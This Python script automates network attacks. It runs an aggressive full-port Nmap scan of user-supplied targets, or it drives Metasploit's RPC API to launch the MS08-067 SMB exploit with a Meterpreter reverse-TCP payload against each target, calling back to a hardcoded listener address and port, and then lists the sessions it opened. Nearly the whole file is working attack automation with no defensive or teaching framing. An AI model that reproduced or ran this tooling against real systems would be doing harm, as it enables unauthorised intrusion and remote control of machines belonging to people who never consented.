import nmap
import requests
import msgpack
import time
import json

class MetasploitAPI:
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.url = f"http://{host}:{port}/api/"
        self.username = username
        self.password = password
        self.token = None
        self.headers = {'Content-Type': 'binary/message-pack'}

    def login(self):
        data = {
            'method': 'auth.login',
            'username': self.username,
            'password': self.password
        }
        response = self._send_request(data)
        self.token = response.get('token')
        return self.token

    def _send_request(self, data):
        if self.token:
            data['token'] = self.token
        try:
            response = requests.post(self.url, headers=self.headers, data=msgpack.packb(data))
            return msgpack.unpackb(response.content)
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            return None

    def create_console(self):
        data = {'method': 'console.create'}
        return self._send_request(data)

    def read_console(self, console_id):
        data = {'method': 'console.read', 'id': console_id}
        return self._send_request(data)

    def write_console(self, console_id, command):
        data = {'method': 'console.write', 'id': console_id, 'data': command}
        return self._send_request(data)

    def execute_module(self, module_type, module_name, options):
        data = {
            'method': 'module.execute',
            'module_type': module_type,
            'module_name': module_name,
            'options': options
        }
        return self._send_request(data)

    def list_sessions(self):
        data = {'method': 'session.list'}
        return self._send_request(data)

def select_tool():
    while True:
        choice = input("Enter the tool to use (Nmap or Metasploit): ").lower()
        if choice in ['nmap', 'metasploit']:
            return choice
        else:
            print("Invalid choice. Please enter 'Nmap' or 'Metasploit'.")

def get_targets_from_input():
    choice = input("Do you want to enter targets manually (Y/N)? ").lower()
    if choice == 'y':
        targets = input("Enter the target(s) to scan (comma-separated or range): ")
        return targets.strip().split(',')
    else:
        targets_file = input("Enter the path to the JSON file containing target list: ")
        return read_json_file(targets_file)

def save_to_json(data, filename):
    try:
        with open(filename, 'w') as json_file:
            json.dump(data, json_file, indent=4)
        print(f"Scan results saved to {filename}")
    except IOError as e:
        print(f"Error saving to file: {e}")

def read_json_file(filename):
    try:
        with open(filename, 'r') as json_file:
            data = json.load(json_file)
        return [entry['url'] for entry in data]
    except (IOError, KeyError) as e:
        print(f"Error reading from file: {e}")
        return []

def scan_with_nmap(targets):
    nm = nmap.PortScanner()
    scan_arguments = '-sS -sV -O -p-'
    print(f"Scanning {targets} with arguments: {scan_arguments}")
    for target in targets:
        nm.scan(hosts=target, arguments=scan_arguments)
        print(f"Completed scan of {target}")
        # Save partial results after each host is scanned
        save_to_json({target: nm[target]}, f"{target}_scan_results.json")

    results = {}
    for host in nm.all_hosts():
        results[host] = {
            'hostname': nm[host].hostname(),
            'state': nm[host].state(),
            'osclass': nm[host].get('osclass', []),
            'ports': []
        }
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                port_info = nm[host][proto][port]
                results[host]['ports'].append({
                    'port': port,
                    'state': port_info['state'],
                    'service': port_info.get('product', ''),
                    'version': port_info.get('version', ''),
                    'cpe': port_info.get('cpe', '')
                })
    return results

def exploit_with_metasploit(api, target, lhost, lport):
    if not api.login():
        print("Failed to login to Metasploit")
        return

    console = api.create_console()
    if not console:
        print("Failed to create console")
        return

    console_id = console['id']

    exploit = 'exploit/windows/smb/ms08_067_netapi'
    payload = 'windows/meterpreter/reverse_tcp'
    options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}

    commands = [
        f'use {exploit}\n',
        *(f'set {option} {value}\n' for option, value in options.items()),
        f'set PAYLOAD {payload}\n',
        'exploit -j\n'
    ]

    for command in commands:
        api.write_console(console_id, command)
        time.sleep(1)  # Allow some time for the command to process

    time.sleep(10)  # Wait for the exploit module to execute
    result = api.read_console(console_id)
    print(result.get('data', 'No data returned'))

    sessions = api.list_sessions()
    print('Sessions:', sessions)

    # Destroy the console
    api.write_console(console_id, 'exit\n')
    api.write_console(console_id, 'exit\n')  # In some cases, two exit commands are needed

# Example usage
tool_choice = select_tool()
if tool_choice == 'nmap':
    # Get scan targets
    nmap_targets = get_targets_from_input()
    print("Nmap Scan Targets:", nmap_targets)

    # Nmap scanning
    nmap_results = scan_with_nmap(nmap_targets)
    print("Nmap Scan Results:", nmap_results)

    # Save scan results to JSON file
    save_to_json(nmap_results, 'nmap_scan_results.json')
elif tool_choice == 'metasploit':
    # Get scan targets
    targets = get_targets_from_input()

    lhost = '192.168.1.101'
    lport = 4444

    # Metasploit exploitation
    msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
    for target in targets:
        exploit_with_metasploit(msf_api, target, lhost, lport)

